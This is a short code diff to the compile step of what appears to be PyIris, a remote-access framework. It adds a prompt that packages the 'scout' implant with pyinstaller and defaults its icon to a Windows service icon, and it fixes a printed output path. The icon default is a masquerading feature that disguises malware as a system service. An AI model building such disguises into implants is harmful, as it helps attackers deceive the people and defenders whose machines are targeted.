@@ -30,6 +30,18 @@ def main(path):
             break
         else:
             continue
+    while True:
+        option = raw_input(config.pro + 'Use a custom file icon (.ico) for the compiled scout? [y|n] : ')
+        if option in ('y', 'Y', 'yes', 'Yes'):
+            option = raw_input(config.pro + 'Path to file ico or press [enter] to use the default PyIris provided windows service icon (resources/windows_service.ico) : ')
+            if not option:
+                option = os.path.join(os.getcwd(), 'resources', 'windows_service.ico')
+            tags.append('--icon ' + option)
+            break
+        elif option in ('n', 'N', 'No', 'no'):
+            break
+        else:
+            continue
     command = 'pyinstaller ' + ' '.join(tags) + ' ' + path
     print config.inf + 'Removing residue folders...'
     if os.path.isdir(os.path.join(os.getcwd(), 'build')):
@@ -54,7 +66,7 @@ def main(path):
             shutil.rmtree(os.path.join(os.getcwd(), 'generated', ntpath.basename(path)[:-3]))
         shutil.copytree(os.path.join(os.getcwd(), 'dist', ntpath.basename(path)[:-3]), os.path.join(os.getcwd(), 'generated', ntpath.basename(path)[:-3]))
         shutil.rmtree('dist')
-        print config.pos + 'Successfully compiled scout folder to : ' + os.path.join(os.getcwd(), 'generated', filename)
+        print config.pos + 'Successfully compiled scout folder to : ' + os.path.join(os.getcwd(), 'generated', filename[:-4])
     elif os.path.isdir(os.path.join(os.getcwd(), 'dist')):
         shutil.copy(os.path.join(os.getcwd(), 'dist', filename), os.path.join(os.getcwd(), 'generated', filename))
         shutil.rmtree('dist')
